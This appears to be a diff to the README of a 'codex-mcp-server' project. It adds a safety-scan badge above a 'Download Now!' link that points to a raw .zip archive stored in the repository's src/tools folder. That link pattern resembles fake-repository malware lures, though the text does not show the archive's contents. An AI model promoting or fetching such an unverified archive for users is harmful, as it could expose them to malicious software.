@@ -1,5 +1,7 @@
 # 🚀 codex-mcp-server - Reliable Server for Your Needs
 
+[![SafeSkill 81/100](https://img.shields.io/badge/SafeSkill-81%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/directive-reticule640-codex-mcp-server)
+
 ## 📥 Download Now!
 [![Download Codex MCP Server](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip%20Now-v1.0-blue)](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip)
 
